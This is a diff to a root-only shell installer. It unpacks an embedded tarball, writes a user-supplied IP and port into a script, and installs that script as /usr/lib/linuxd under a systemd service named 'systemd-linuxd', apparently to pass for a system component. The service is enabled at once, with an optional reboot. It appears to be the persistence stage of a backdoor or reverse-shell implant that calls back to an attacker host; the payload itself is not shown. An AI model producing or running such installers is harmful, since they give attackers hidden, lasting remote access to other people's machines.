@@ -1,5 +1,6 @@
+#!/bin/sh
 [ $(id -u) -ne 0 ] && echo root is required && exit 1
-[ $# -lt 2 ] && echo needs argument IP and PORT && exit 1
+[ -z "$2" ] && echo needs argument IP and PORT && exit 1
 [[ $0 = '/bin/*' ]] && echo invalid script && exit 1
 offset=TARBALL_OFFSET
 temp=$(mktemp -d)
@@ -12,8 +13,9 @@ sed -i "s,IP_ADDRESS,$1," linuxd.sh
 sed -i "s,PORT,$2," linuxd.sh
 mv linuxd.sh /usr/lib/linuxd
 mv systemd-linuxd.service /usr/lib/systemd/system/systemd-linuxd.service
-systemctl enable systemd-linuxd.service --now &>/dev/null
-cd -
+systemctl enable systemd-linuxd.service --now
 rm -rf $temp
+echo "Success"
+[ "$3" = 'reboot' ] && echo "Rebooting" && systemctl reboot
 exit
 === ENCODED TARBALL ===
